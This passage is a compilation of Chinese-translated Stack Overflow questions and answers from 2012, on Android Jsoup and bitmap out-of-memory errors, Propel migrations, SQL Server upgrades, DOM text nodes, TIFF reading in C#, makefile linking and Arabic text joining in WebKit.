            if (liElementsCounter < 1 && element.html().contains("Page ("))
            {
                String liElementText = element.html();
                pagesAmount = liElementText.substring((liElementText.indexOf("/") + 2), (liElementText.lastIndexOf(")") - 1));
                liElementsCounter++;
            }
        }

        doc = Jsoup.connect(selectedGenre.replace("p1", "p" + new Random().nextInt(1 + Integer.parseInt(pagesAmount)))).timeout(0).get();

        Elements aNameElements = doc.select("a[name]");

        ArrayList<String> elementsArray = new ArrayList<String>(); 

        int elementsSize = 0;

        for (Element element : aNameElements)
        {   
            if (elementsSize % 3 == 0)
            {
                elementsArray.add(element.attr("href").replaceAll("\\s","")); 
            }

            elementsSize++;
        }
    } 
    catch (Exception ex)
    {
        tv.setText(ex.getMessage());
        System.out.println("Exception! " + ex.getMessage());
    }
}
} 
```

**这只是我真正想要执行的代码总量的 1/15**

日志猫：

```
06-22 14:23:18.323: D/InetAddress(2614): SOMEWEBSITE.COM: SOMEIPADDRESS (family 2, proto 6)
06-22 14:23:19.988: I/global(2614): Default buffer size used in BufferedInputStream constructor. It would be better to be explicit if an 8k buffer is required.
06-22 14:23:23.048: D/dalvikvm(2614): GC freed 2144 objects / 375080 bytes in 100ms
06-22 14:23:23.148: D/dalvikvm(2614): GC freed 117 objects / 218976 bytes in 87ms
06-22 14:23:23.518: D/dalvikvm(2614): GC freed 4578 objects / 177480 bytes in 102ms
06-22 14:23:23.908: D/dalvikvm(2614): GC freed 3119 objects / 171824 bytes in 117ms
06-22 14:23:24.158: D/dalvikvm(2614): GC freed 1831 objects / 69416 bytes in 114ms
06-22 14:23:24.488: D/dalvikvm(2614): GC freed 2798 objects / 103000 bytes in 137ms
06-22 14:23:24.908: D/dalvikvm(2614): GC freed 3480 objects / 126832 bytes in 132ms
06-22 14:23:25.408: D/dalvikvm(2614): GC freed 4624 objects / 176448 bytes in 130ms
06-22 14:23:26.028: D/dalvikvm(2614): GC freed 5390 objects / 201136 bytes in 145ms
06-22 14:23:26.738: D/dalvikvm(2614): GC freed 7460 objects / 281696 bytes in 149ms
06-22 14:23:27.658: D/dalvikvm(2614): GC freed 11187 objects / 712496 bytes in 163ms
06-22 14:23:28.398: D/dalvikvm(2614): GC freed 8357 objects / 315152 bytes in 163ms
06-22 14:23:29.138: I/dalvikvm-heap(2614): Clamp target GC heap from 16.463MB to 16.000MB
06-22 14:23:29.138: D/dalvikvm(2614): GC freed 7704 objects / 289080 bytes in 162ms
06-22 14:23:30.688: I/global(2614): Default buffer size used in BufferedInputStream constructor. It would be better to be explicit if an 8k buffer is required.
06-22 14:23:30.878: D/dalvikvm(2614): GC freed 18183 objects / 6667672 bytes in 184ms
06-22 14:23:34.768: D/dalvikvm(2614): GC freed 6048 objects / 694432 bytes in 155ms
06-22 14:23:35.428: D/dalvikvm(2614): GC freed 8257 objects / 311744 bytes in 172ms
06-22 14:23:36.068: I/dalvikvm-heap(2614): Clamp target GC heap from 16.330MB to 16.000MB
06-22 14:23:36.068: D/dalvikvm(2614): GC freed 7544 objects / 284536 bytes in 166ms
06-22 14:23:36.818: I/dalvikvm-heap(2614): Clamp target GC heap from 17.536MB to 16.000MB
06-22 14:23:36.818: D/dalvikvm(2614): GC freed 10209 objects / 482496 bytes in 188ms
06-22 14:23:36.998: I/dalvikvm-heap(2614): Clamp target GC heap from 17.631MB to 16.000MB
06-22 14:23:36.998: D/dalvikvm(2614): GC freed 4 objects / 152 bytes in 171ms
06-22 14:23:36.998: I/dalvikvm-heap(2614): Forcing collection of SoftReferences for 100180-byte allocation
06-22 14:23:37.178: I/dalvikvm-heap(2614): Clamp target GC heap from 17.631MB to 16.000MB
06-22 14:23:37.178: D/dalvikvm(2614): GC freed 0 objects / 0 bytes in 180ms
06-22 14:23:37.178: E/dalvikvm-heap(2614): Out of memory on a 100180-byte allocation.
06-22 14:23:37.178: I/dalvikvm(2614): "main" prio=5 tid=3 RUNNABLE
06-22 14:23:37.178: I/dalvikvm(2614):   | group="main" sCount=0 dsCount=0 s=0 obj=0x40019680
06-22 14:23:37.178: I/dalvikvm(2614):   | sysTid=2614 nice=0 sched=0/0 handle=-1095799844
06-22 14:23:37.178: I/dalvikvm(2614):   at java.lang.String.<init>(String.java:~512)
06-22 14:23:37.178: I/dalvikvm(2614):   at java.lang.String.copyValueOf(String.java:769)
06-22 14:23:37.178: I/dalvikvm(2614):   at java.nio.CharArrayBuffer.toString(CharArrayBuffer.java:99)
06-22 14:23:37.178: I/dalvikvm(2614):   at org.jsoup.helper.DataUtil.parseByteData(DataUtil.java:86)
06-22 14:23:37.178: I/dalvikvm(2614):   at org.jsoup.helper.HttpConnection$Response.parse(HttpConnection.java:469)
06-22 14:23:37.178: I/dalvikvm(2614):   at org.jsoup.helper.HttpConnection.get(HttpConnection.java:147)
06-22 14:23:37.178: I/dalvikvm(2614):   at dk.Activity.onCreate(Activity.java:64)
06-22 14:23:37.188: I/dalvikvm(2614):   at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1132)
06-22 14:23:37.188: I/dalvikvm(2614):   at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2231)
06-22 14:23:37.188: I/dalvikvm(2614):   at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2284)
06-22 14:23:37.188: I/dalvikvm(2614):   at android.app.ActivityThread.access$1800(ActivityThread.java:112)
06-22 14:23:37.188: I/dalvikvm(2614):   at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1692)
06-22 14:23:37.188: I/dalvikvm(2614):   at android.os.Handler.dispatchMessage(Handler.java:99)
06-22 14:23:37.188: I/dalvikvm(2614):   at android.os.Looper.loop(Looper.java:123)
06-22 14:23:37.188: I/dalvikvm(2614):   at android.app.ActivityThread.main(ActivityThread.java:3948)
06-22 14:23:37.188: I/dalvikvm(2614):   at java.lang.reflect.Method.invokeNative(Native Method)
06-22 14:23:37.188: I/dalvikvm(2614):   at java.lang.reflect.Method.invoke(Method.java:521)
06-22 14:23:37.188: I/dalvikvm(2614):   at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:782)
06-22 14:23:37.188: I/dalvikvm(2614):   at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:540)
06-22 14:23:37.188: I/dalvikvm(2614):   at dalvik.system.NativeStart.main(Native Method)
06-22 14:23:37.198: D/AndroidRuntime(2614): Shutting down VM
06-22 14:23:37.198: W/dalvikvm(2614): threadid=3: thread exiting with uncaught exception (group=0x40013140)
06-22 14:23:37.198: E/AndroidRuntime(2614): Uncaught handler: thread main exiting due to uncaught exception
06-22 14:23:37.208: E/AndroidRuntime(2614): java.lang.OutOfMemoryError
06-22 14:23:37.208: E/AndroidRuntime(2614):     at java.lang.String.<init>(String.java:512)
06-22 14:23:37.208: E/AndroidRuntime(2614):     at java.lang.String.copyValueOf(String.java:769)
06-22 14:23:37.208: E/AndroidRuntime(2614):     at java.nio.CharArrayBuffer.toString(CharArrayBuffer.java:99)
06-22 14:23:37.208: E/AndroidRuntime(2614):     at org.jsoup.helper.DataUtil.parseByteData(DataUtil.java:86)
06-22 14:23:37.208: E/AndroidRuntime(2614):     at org.jsoup.helper.HttpConnection$Response.parse(HttpConnection.java:469)
06-22 14:23:37.208: E/AndroidRuntime(2614):     at org.jsoup.helper.HttpConnection.get(HttpConnection.java:147)
06-22 14:23:37.208: E/AndroidRuntime(2614):     at dk.Activity.onCreate(Activity.java:64)
06-22 14:23:37.208: E/AndroidRuntime(2614):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1132)
06-22 14:23:37.208: E/AndroidRuntime(2614):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2231)
06-22 14:23:37.208: E/AndroidRuntime(2614):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2284)
06-22 14:23:37.208: E/AndroidRuntime(2614):     at android.app.ActivityThread.access$1800(ActivityThread.java:112)
06-22 14:23:37.208: E/AndroidRuntime(2614):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1692)
06-22 14:23:37.208: E/AndroidRuntime(2614):     at android.os.Handler.dispatchMessage(Handler.java:99)
06-22 14:23:37.208: E/AndroidRuntime(2614):     at android.os.Looper.loop(Looper.java:123)
06-22 14:23:37.208: E/AndroidRuntime(2614):     at android.app.ActivityThread.main(ActivityThread.java:3948)
06-22 14:23:37.208: E/AndroidRuntime(2614):     at java.lang.reflect.Method.invokeNative(Native Method)
06-22 14:23:37.208: E/AndroidRuntime(2614):     at java.lang.reflect.Method.invoke(Method.java:521)
06-22 14:23:37.208: E/AndroidRuntime(2614):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:782)
06-22 14:23:37.208: E/AndroidRuntime(2614):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:540)
06-22 14:23:37.208: E/AndroidRuntime(2614):     at dalvik.system.NativeStart.main(Native Method)
06-22 14:23:37.218: I/dalvikvm(2614): threadid=7: reacting to signal 3
06-22 14:24:11.958: I/Process(2614): Sending signal. PID: 2614 SIG: 9 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-25T09:25:50.350

~~通过将所有代码分成 2 个活动来解决问题！（为什么这是一个很好的问题，因为第二个 Activity 包含比第一个 Activity 要求更高的代码）~~

第一个 Activity 包含从第一个 FOR 循环顶部到末尾的代码。

~~第二个 Activity 包含从第一个 FOR 循环结束到剩余代码结束的代码。~~

从 1.6.3 降级到 1.5.2 解决了这个问题 - 可能是 Jsoup 1.6.3 中的内存泄漏。

# php - 如何使用 Propel Migration 和 Symfony 修改表的列

> ID：11155828
> 
> 赞同：0
> 
> 时间：2012-06-22T12:06:13.290
> 
> 标签：php, mysql, symfony1, migration, propel

我在 symfony 项目中的推进迁移遇到了一个巨大的问题。我第一次尝试更改表格的一列，但在 CLI 上总是出现以下错误：

```
$ php symfony propel:up
>> propel    Executing migration PropelMigration_1340354091 up
>> Failed to execute SQL "ALTER TABLE `AEX_PROJECT` MODIFY `DESCRIPTION` VARCHAR(200)". Aborting migration. ... 
```

我的 getUpSql() 方法如下所示：

```
 public function getUpSQL()
        {   
            return array (
      'propel' => '
    # This is a fix for InnoDB in MySQL >= 4.1.x
    # It "suspends judgement" for fkey relationships until all tables are set.
    SET FOREIGN_KEY_CHECKS = 0;

    ALTER TABLE `AEX_PROJECT` MODIFY `DESCRIPTION` VARCHAR(2000);                           

    # This restores the fkey checks, after having unset them earlier
    SET FOREIGN_KEY_CHECKS = 1;
    ',
);
} 
```

我的想法不多了。我还尝试了 ALTER COLUMN 或 CHANGE。我还尝试了不同类型的逗号（例如 ' 或 " 或没有逗号）。如果我通过 PhpMyAdmin 而不是通过 Propel Migration 运行迁移，它可以工作。

我想知道 Propel 中是否存在与此相关的已知错误。我可以以某种方式解决这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T22:20:22.950

我认为这是一个非常基本的错误，您传递的 varchar(2000) 肯定是不可接受的:) 使用 varchar(255) 或使用文本，请查看文档中的文本

# sql-server-2008 - 将 SQL Server Express 升级到服务于 Microsoft Sharepoint 2007 (MOSS 2077) 实施的 Standard 2008 R2 时是否有任何陷阱？

> ID：11155840
> 
> 赞同：0
> 
> 时间：2012-06-22T12:06:56.910
> 
> 标签：sql-server-2008, sharepoint-2007

将 SQL Server Express 升级到服务于 Microsoft Sharepoint 2007 (MOSS 2077) 实施的 SQL Server Standard 2008 R2 时是否有任何陷阱？

我们最近通过在现有 Express 版本之上安装 SQL 标准版完成了团队基础 sql 服务器的更新，没有任何问题。所以我们计划以同样的方式升级 Sharepoint 服务器。

有没有我们应该注意的陷阱或提示？我担心在 Sharepoint 中完成的数据和自定义不会丢失或损坏。

我们当然会在任何更改之前进行备份。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-22T22:19:15.217

问题：将 SQL Server Express 升级到为 Microsoft Sharepoint 2007 (MOSS 2077) 实施提供服务的 SQL Server Standard 2008 R2 时是否有任何陷阱？

没有真正的陷阱，但肯定有一些项目要放在您的迁移清单上。您需要将整个实例从 Express 转换为 2008 R2“真正的数据库解决方案”。这是一个很好的举措。

鉴于您有一个随 Sharepoint 安装一起提供的 Express 版本，它很可能不是 SQL Server 2008 或 SQL Server 2008 R2 版本，并且很可能没有安装 SSMS 工具。您将需要标准版安装介质和产品密钥。这是给定的。直接从标准版媒体运行安装程序。不要尝试从已安装的 SQL Server 运行安装程序并使用版本升级选项。

有了标准版后，使用 SQLCMD 验证安装。再次从安装媒体运行安装程序并安装所需的共享组件，例如 SSMS、集成服务、联机丛书等。Sharepoint 安装程序安装的 SQL 代理通过 Sharepoint 安装程序安装的 SQL Express 可能被禁用并设置为作为“网络服务”运行并且没有 SysAdmin SQL Server 权限。

将代理的服务帐户更改为具有系统管理员权限。然后 SQL 代理将启动。检查共享点数据库的数据库选项、文件大小、自动增长设置和其他维护项目。您可能希望将 Sharepoint 数据库移动到比 Program Files --> Common Files 中的默认文件夹更好的位置。祝您离开 Express Edition 时好运。

# java - 如何使用浮点而不是整数比例缩放位图，而不会出现 OutOfMemory 错误？

> ID：11155841
> 
> 赞同：0
> 
> 时间：2012-06-22T12:07:07.243
> 
> 标签：java, android, image-scaling

我正在尝试调整可绘制对象的大小，其比例仅在极少数情况下是可以存储为整数的值。目前我正在使用这个：

```
private BitmapDrawable getCustomMarker(float scale){
    Bitmap originalMarker = BitmapFactory.decodeResource(this.getResources(), R.drawable.zone);
    int width = originalMarker.getWidth();
    int height = originalMarker.getHeight();

    Matrix matrix = new Matrix();
    matrix.postScale(scale, scale);

    Bitmap bitmap = Bitmap.createBitmap(originalMarker, 0, 0, width, height, matrix, true);

    BitmapDrawable bm = new BitmapDrawable(bitmap);
    bm.setBounds(0,0,bitmap.getWidth(),bitmap.getHeight());
    return bm;  
} 
```

但它时不时会抛出 OutOfMemoryError .... 有时当我想将比例更改为 > 1 时，以及当我想将其缩小到 < 1 时。

```
06-22 13:51:41.700: E/dalvikvm-heap(15021): Out of memory on a 10035216-byte allocation.
06-22 13:51:41.700: I/dalvikvm(15021): "main" prio=5 tid=1 RUNNABLE
06-22 13:51:41.700: I/dalvikvm(15021):   | group="main" sCount=0 dsCount=0 obj=0x401c75a8 self=0x12690
06-22 13:51:41.700: I/dalvikvm(15021):   | sysTid=15021 nice=0 sched=0/0 cgrp=default handle=-1342909336
06-22 13:51:41.700: I/dalvikvm(15021):   | schedstat=( 12261804000 820393000 4881 ) utm=1121 stm=105 core=0
06-22 13:51:41.700: I/dalvikvm(15021):   at android.graphics.Bitmap.nativeCreate(Native Method)
06-22 13:51:41.700: I/dalvikvm(15021):   at android.graphics.Bitmap.createBitmap(Bitmap.java:604)
06-22 13:51:41.700: I/dalvikvm(15021):   at android.graphics.Bitmap.createBitmap(Bitmap.java:551)
06-22 13:51:41.700: I/dalvikvm(15021):   at android.graphics.Bitmap.createScaledBitmap(Bitmap.java:437)
06-22 13:51:41.700: I/dalvikvm(15021):   at m.p.Activitys.GeoFancingActivity.getCustomMarker(GeoFancingActivity.java:61)
06-22 13:51:41.700: I/dalvikvm(15021):   at m.p.Activitys.GeoFancingActivity.adjustFanceScale(GeoFancingActivity.java:254)
06-22 13:51:41.700: I/dalvikvm(15021):   at m.p.Activitys.GeoFancingActivity.dispatchTouchEvent(GeoFancingActivity.java:194)
06-22 13:51:41.700: I/dalvikvm(15021):   at com.android.internal.policy.impl.PhoneWindow$DecorView.dispatchTouchEvent(PhoneWindow.java:1835)
06-22 13:51:41.700: I/dalvikvm(15021):   at android.view.View.dispatchPointerEvent(View.java:4694)
06-22 13:51:41.700: I/dalvikvm(15021):   at android.view.ViewRoot.deliverPointerEvent(ViewRoot.java:2419)
06-22 13:51:41.700: I/dalvikvm(15021):   at android.view.ViewRoot.handleMessage(ViewRoot.java:2080)
06-22 13:51:41.700: I/dalvikvm(15021):   at android.os.Handler.dispatchMessage(Handler.java:99)
06-22 13:51:41.700: I/dalvikvm(15021):   at android.os.Looper.loop(Looper.java:132)
06-22 13:51:41.700: I/dalvikvm(15021):   at android.app.ActivityThread.main(ActivityThread.java:4126)
06-22 13:51:41.700: I/dalvikvm(15021):   at java.lang.reflect.Method.invokeNative(Native Method)
06-22 13:51:41.700: I/dalvikvm(15021):   at java.lang.reflect.Method.invoke(Method.java:491)
06-22 13:51:41.700: I/dalvikvm(15021):   at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:844)
06-22 13:51:41.700: I/dalvikvm(15021):   at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:602)
06-22 13:51:41.700: I/dalvikvm(15021):   at dalvik.system.NativeStart.main(Native Method)
06-22 13:51:41.700: D/AndroidRuntime(15021): Shutting down VM
06-22 13:51:41.700: W/dalvikvm(15021): threadid=1: thread exiting with uncaught exception (group=0x401c0760)
06-22 13:51:41.700: E/AndroidRuntime(15021): FATAL EXCEPTION: main
06-22 13:51:41.700: E/AndroidRuntime(15021): java.lang.OutOfMemoryError
06-22 13:51:41.700: E/AndroidRuntime(15021):    at android.graphics.Bitmap.nativeCreate(Native Method)
06-22 13:51:41.700: E/AndroidRuntime(15021):    at android.graphics.Bitmap.createBitmap(Bitmap.java:604)
06-22 13:51:41.700: E/AndroidRuntime(15021):    at android.graphics.Bitmap.createBitmap(Bitmap.java:551)
06-22 13:51:41.700: E/AndroidRuntime(15021):    at android.graphics.Bitmap.createScaledBitmap(Bitmap.java:437)
06-22 13:51:41.700: E/AndroidRuntime(15021):    at m.p.Activitys.GeoFancingActivity.getCustomMarker(GeoFancingActivity.java:61)
06-22 13:51:41.700: E/AndroidRuntime(15021):    at m.p.Activitys.GeoFancingActivity.adjustFanceScale(GeoFancingActivity.java:254)
06-22 13:51:41.700: E/AndroidRuntime(15021):    at m.p.Activitys.GeoFancingActivity.dispatchTouchEvent(GeoFancingActivity.java:194)
06-22 13:51:41.700: E/AndroidRuntime(15021):    at com.android.internal.policy.impl.PhoneWindow$DecorView.dispatchTouchEvent(PhoneWindow.java:1835)
06-22 13:51:41.700: E/AndroidRuntime(15021):    at android.view.View.dispatchPointerEvent(View.java:4694)
06-22 13:51:41.700: E/AndroidRuntime(15021):    at android.view.ViewRoot.deliverPointerEvent(ViewRoot.java:2419)
06-22 13:51:41.700: E/AndroidRuntime(15021):    at android.view.ViewRoot.handleMessage(ViewRoot.java:2080) 
```

我也尝试使用 Bitmap.createScaledBitmap()，但它也会产生这个错误。

```
Bitmap.createScaledBitmap(originalMarker, Math.round(originalMarker.getWidth() * scale), Math.round(originalMarker.getHeight() * scale), true) 
```

我发现可以通过使用[BitmapFactory](https://stackoverflow.com/questions/477572/android-strange-out-of-memory-issue-while-loading-an-image-to-a-bitmap-object/823966#823966)而不是 Bitmap 来解决这个问题。但它的创建方法仅支持与数据类型整数一起缩放。但我*需要*刻度作为浮动。

你对如何解决这个问题有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:48:36.810

位图只是颜色值的数组，因此位图的字节大小是像素的“大小”（取决于位图格式）乘以宽度和高度，它们必须是整数值：索引数组中的访问元素总是整数，不是吗？当然，数组的大小始终是整数。这就是为什么您需要提供两个整数来创建位图。您的第二次尝试是正确的选择，您只需要计算宽度和高度的值，以使它们保持合理的低。据我所知，您的应用程序在尝试分配 10MB 图像时崩溃了，这实际上是一个非常大的图像。如果您需要加载一个巨大的背景，也许您必须将它分成小块并在需要时一次加载一个图块。

完成释放本机内存后不要忘记调用 Bitmap.recycle()，否则您的应用程序可能会崩溃。

# javascript - createElement - 选择散布在文本中间的框

> ID：11155842
> 
> 赞同：2
> 
> 时间：2012-06-22T12:07:12.510
> 
> 标签：javascript, html, createelement

这是我要创建的 HTML：

```
<td>
Tiana is
<select name="U4">...</select>
keen to go to the
<select name="J4">...</select>
market.
</td> 
```

如您所见，有一个`<td>`元素包含一个散文句，其中有选择框。

这很容易做到`$('#id').html(...);`。我想做的是使用`createElement`. 您如何在其他文本*的中间创建选择框？*以下代码是一个开始:)

```
var doc = document,
    fr = doc.createDocumentFragment(),
    td = doc.createElement("td"),
    sel1 = doc.createElement("select"),
    sel2 = doc.createElement("select");

td.innerHTML = "Tiana is keen to go to the market";

sel1.name = "U4";
sel2.name = "J4";  

fr.appendChild(td);
td.appendChild(sel1);    // But these are not in the middle of the sentence
td.appendChild(sel2); 
```

顺便说一句：我也认识到我必须创建`select`选项。

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-22T12:17:11.280

还有一个名为`createTextNode()`( [MDN docu](https://developer.mozilla.org/en/DOM%3adocument.createTextNode) ) 的函数用于创建简单的文本作为内容。因此，一种解决方案是相应地拆分您的文本，将其转换为 textnodes，然后将其附加：

```
var doc = document,
    fr = doc.createDocumentFragment(),
    td = doc.createElement("td"),
    sel1 = doc.createElement("select"),
    sel2 = doc.createElement("select"),
    text1 = doc.createTextNode( 'Tiana is ' ),
    text2 = doc.createTextNode( ' keen to go to the ' ),
    text3 = doc.createTextNode(  'market' );

sel1.name = "U4";
sel2.name = "J4";  

fr.appendChild(td);
td.appendChild( text1 );
td.appendChild(sel1); 
td.appendChild( text2 );
td.appendChild(sel2);
td.appendChild( text3 ); 
```

在这里您可以找到一个示例小提琴：[链接](http://jsfiddle.net/4myFg/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T12:17:27.923

我想你需要有这个：

```
<td>
<span>Tiana is</span>
<select name="U4">...</select>
<span>keen to go to the</span>
<select name="J4">...</select>
<span>market.</span>
</td> 
```

或这样做：

```
td.innerHTML = 'Tiana is <select id="U4" name="U4" /> keen to go to the <select id="J4" name="J4" /> market';
var uOpt1 = document.createElement('option');
//Set option properties
td.getElementById('U4').appendChild(uOpt1); //etc 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-22T12:24:38.313

# c# - 如何在 C# 中使用位图类读取 1MB .tif 文件

> ID：11155845
> 
> 赞同：4
> 
> 时间：2012-06-22T12:07:25.083
> 
> 标签：c#, image-processing

我有麻烦了。如何在 C# 中使用位图类读取 1MB .tif 文件。我使用了下面的代码，但出现错误“内存不足”。我搜索了谷歌很多但还没有找到任何答案。

```
string imgPath;
            imgPath = @"C:\Documents and Settings\shree\Desktop\2012.06.09.15.35.42.2320.tif";
            Image newImage = Image.FromFile(imgPath);

            Bitmap img;
            img = new Bitmap(imgPath, true);

            MessageBox.Show("Width: "+ img.Width + " Height: " + img.Height); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T12:41:21.983

如果您只需要读取文件的宽度和高度而不将其加载到内存中，则可以使用 WPF 的[BitmapDecoder](http://msdn.microsoft.com/en-us/library/system.windows.media.imaging.bitmapdecoder.aspx)类：

```
using System;
using System.IO;
using System.Linq;
using System.Windows.Media.Imaging;

class Program
{
    static void Main()
    {
        using (var stream = File.OpenRead(@"c:\work\some_huge_image.tif"))
        {
            var decoder = BitmapDecoder.Create(stream, BitmapCreateOptions.None, BitmapCacheOption.None);
            var frame = decoder.Frames.First();
            Console.WriteLine(
                "width: {0}, height: {1}", 
                frame.PixelWidth, 
                frame.PixelHeight
            );
        }
    }
} 
```

如果由于某种原因您停留在某个 pre-.NET 3.0 时代，您可以查看图像元数据以提取此信息，而无需将整个图像加载到内存中，如[以下答案](https://stackoverflow.com/a/112711/29407)所示。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-06-22T12:49:28.017

从 1MB 大小的文件创建位图对象没有问题。它可以轻松处理更大的图像。我尝试使用 16MB 的图像。您使用了很多不需要的代码。只需使用

```
Bitmap mybitmap=new Bitmap(path); 
```

# makefile - 如果未在包含文件的预处理器指令中指定，makefile 中的库是否仍会添加到编译中？

> ID：11155846
> 
> 赞同：0
> 
> 时间：2012-06-22T12:07:26.347
> 
> 标签：makefile, preprocessor

如果未在包含源文件的预处理器指令中指定，makefile 中的库是否仍会添加到编译中？下面列出了有问题的 makefile，我将 lF77 和 lI77 引用到未指定的库。谢谢。

**生成文件：**

```
composite: maincomp.c screenio.c cscreens.c turbine.c stat.c decide.c    file.c\
          sys.c dummy.c util.c cglobal.h composite.h cscreens.h f2c.h\
          maincomp.h screenio.h turbine.h util.h makefile   gcc maincomp.c screenio.c cscreens.c turbine.c stat.c decide.c util.c\
           file.c dummy.c sys.c -I/usr/5include -L/home/boltoj/f2c/libF77\
           -lF77 -L/home/boltoj/f2c/libI77 -lI77 -L/usr/5lib -lcurses -lm\
           -o composite -g 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T12:49:20.997

链接器仅链接解析未解析符号的库。换句话说，如果库不提供目标文件所需的任何符号，则该库不会被链接。

# html - HTML 中部分彩色的阿拉伯语单词

> ID：11155849
> 
> 赞同：17
> 
> 时间：2012-06-22T12:07:32.803
> 
> 标签：html, arabic

我不会说阿拉伯语，但我需要在我们的网站上提供对阿拉伯语的特定支持。我需要部分阿拉伯语单词`<span>`与其他单词的风格不同。当我键入两个字符时`ش`，`س`它们被组合成单词`شس`，但是当我使用 HTML 标记时

```
<span>ش</span>س 
```

这些字母在输出中没有正确连接。

![在此处输入图像描述](../Images/c1457d1bc4f1999ea63649ee346c7bb6.png)

在图片中，期望的输出在第二行，实际输出在第一行。

***编辑：***它适用于 Firefox，但不适用于 Chrome/Safari。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-06-22T12:55:54.583

在元素内容`&zwj;`的末尾插入一个零宽度的连接符（例如使用实体引用）： 。`span``<span>ش&zwj;</span>س`

更一般地说，在文本应该具有草书（连接）行为并可能破坏它的情况下，每个元素的开头和结尾以及每个`span`元素之前和之后（只是为了更确定）的零宽度连接符。`span``span`

Andreas Prilop在[双向文本](http://www.user.uni-hannover.de/nhtcapri/bidirectional-text.html)页面上讨论并说明了该问题。

**更新：**不幸的是，它似乎`&zwj;`对当前版本的 WebKit 浏览器没有帮助。无论如何，他们似乎都将 HTML 标记视为破坏连接行为。

**更新2：**正如@NasserAl-Wohaibi 的评论中所述，新问题可以通过使用`&zwj;`两次来解决。但是，在当前适用于 Windows 的 Safari (5.1.7) 中，它没有帮助；事实上，它甚至显示`ش&zwj;س`错误，而没有连接器，它显示`شس`正确。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-22T12:38:07.607

这实际上是[WebKit 中报告的错误](https://bugs.webkit.org/show_bug.cgi?id=6148)，因此可能会影响所有基于 WebKit 的浏览器。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-01T09:54:08.100

正如[Jukka K. Korpela](https://stackoverflow.com/a/11156606/1085495)所指出的，这主要是大多数**基于 WebKit 的浏览器**（chrome、safari 等）中的一个错误。

除了 TAMDEED 字符或获取阿拉伯字母的上下文形式之外，一个简单的技巧是将**零宽度连接符**（`&zwj;`或`&#x200d;`）放在要被视为单个阿拉伯[连字](http://en.wikipedia.org/wiki/Typographical_ligature)的字母之前/之后- 两个字符组成另一个。例如

```
<p>عرب&#x200d;<span style="color: Red;">&#x200d;ي</span></p> 
```

演示：[jsfiddle](http://jsfiddle.net/noonon/esz4S/2/)
另请参阅 webkit[错误](https://bugs.webkit.org/show_bug.cgi?id=6148)报告。

# c# - 如何为 XML 结束标签形成正则表达式

> ID：11155851
> 
> 赞同：-1
> 
> 时间：2012-06-22T12:07:34.430
> 
> 标签：c#, regex

我正在尝试编写一个正则表达式，它将在我的 xml 中添加一个节点。

我当前的xml是：

```
<A>
<B>some value</b>
</A> 
```

我预期的 xml 是：

```
<A>
<B>some value</b>
<C>some new value</C>
</A> 
```

所以我想添加C元素。

谁能帮我写正则表达式，我在写正则表达式方面很新。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T12:26:41.523

If you're after something quick and hacky, something like this should work:

```
s/\(<B>.*<\/b>\)/\1<C>Some new value<\/c>/ 
```

# html - 创建包含失败 JUnit 测试的嵌入式屏幕截图的 HTML 报告

> ID：11155853
> 
> 赞同：2
> 
> 时间：2012-06-22T12:07:38.330
> 
> 标签：html, maven, report, screenshot

我已经组装了一个自定义 JUnit 运行器，当 WebDriver 测试失败时它会保存屏幕截图。我正在使用 Maven 的故障安全插件来创建集成测试报告，TeamCity 是我们的 CI 服务器。

我知道 TeamCity 支持自定义报告，但我不知道如何将图像文件嵌入到 HTML 页面（或页面）中并引用相关测试。

将屏幕截图集成到测试报告中的好方法是什么？是否有可以完成这项工作的 Maven 插件？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-06-03T09:26:42.917

也许[Allure-report](https://github.com/allure-framework/allure-core/wiki)会适合您的目的。它允许创建一个漂亮的报告，其中包含不同的附件，包括屏幕截图。此外，它具有[JUnit 集成](https://github.com/allure-framework/allure-core/wiki/JUnit)和[Teamcity 插件](https://github.com/allure-framework/allure-teamcity-plugin)，因此它完全涵盖了您的用例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T12:57:18.457

不幸的是，没有办法简单地更改报告，因为它们是由无法简单更改的[maven-report-plugin](http://maven.apache.org/plugins/maven-surefire-report-plugin/)生成的。您可以尝试创建一个单独的文件夹并通过 site.xml 描述符创建一个链接。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-23T14:11:46.940

您可以尝试[maven-cobertura-plugin](http://mojo.codehaus.org/cobertura-maven-plugin/)。在您的构建中包含此内容将生成所有测试用例成功、失败和覆盖率的 HTML 报告。希望这可以帮助....

# oracle - 在返回多行的 SQL Plus 中使用绑定变量？

> ID：11155855
> 
> 赞同：2
> 
> 时间：2012-06-22T12:07:45.087
> 
> 标签：oracle, sqlplus, ora-06550, bind-variables, ora-01422

这是一个愚蠢的问题，但我似乎无法解决它。我有一个在 OCI 程序中引起问题的查询，所以我想在 SQL*Plus 中手动运行它以检查那里是否有任何差异。这是查询：

```
